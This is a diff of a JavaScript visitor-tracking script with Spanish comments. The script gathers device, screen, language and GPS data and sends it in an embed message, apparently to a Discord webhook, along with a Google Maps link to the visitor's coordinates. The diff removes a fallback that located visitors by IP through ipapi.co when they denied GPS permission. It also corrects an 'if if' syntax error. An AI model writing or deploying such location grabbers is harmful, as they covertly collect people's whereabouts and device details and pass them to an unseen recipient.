@@ -28,30 +28,7 @@ const datos = {
     hora: new Date().toString()
 };
 
-// ========== NUEVO: FUNCIÓN DE RESPALDO POR IP ==========
-function obtenerPorIP() {
-    fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-            datos.ip = data.ip;
-            datos.ciudad = data.city;
-            datos.region = data.region;
-            datos.pais = data.country_name;
-            datos.latitud = data.latitude;
-            datos.longitud = data.longitude;
-            datos.precision = "Aproximada (IP)";
-            datos.metodo = "IP (usuario negó GPS)";
-            enviar();
-        })
-        .catch(() => {
-            datos.ubicacion = "No disponible";
-            datos.metodo = "Falló todo";
-            enviar();
-        });
-}
-
-// ========== MODIFICADO: INTENTA GPS, SI FALLA → IP ==========
-if if (navigator.geolocation) {
+if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
         (position) => {
             datos.latitud = position.coords.latitude;
@@ -60,13 +37,13 @@ if if (navigator.geolocation) {
             enviar();
         },
         (error) => {
-            // SI NEGA GPS → OBTIENE POR IP AUTOMÁTICAMENTE
-            obtenerPorIP();
-        },
-        { timeout: 10000 }
+            datos.gps = "Denegado";
+            enviar();
+        }
     );
 } else {
-    obtenerPorIP();
+    datos.gps = "No soportado";
+    enviar();
 }
 
 function enviar() {
@@ -81,8 +58,7 @@ function enviar() {
                 { name: "Dispositivo", value: datos.dispositivo.substring(0, 500) },
                 { name: "Plataforma", value: datos.plataforma },
                 { name: "Pantalla", value: datos.pantalla },
-                { name: "Idioma", value: datos.idioma },
-                { name: "Metodo", value: datos.metodo || "Desconocido" }
+                { name: "Idioma", value: datos.idioma }
             ]
         }]
     };
@@ -91,9 +67,6 @@ function enviar() {
         mensaje.embeds[0].fields.push(
             { name: "Latitud", value: datos.latitud.toString() },
             { name: "Longitud", value: datos.longitud.toString() },
-            { name: "Precision", value: datos.precision || "N/A" },
-            { name: "IP", value: datos.ip || "N/A" },
-            { name: "Ciudad", value: datos.ciudad || "N/A" },
             { name: "Mapa", value: "https://maps.google.com/?q=" + datos.latitud + "," + datos.longitud }
         );
     }
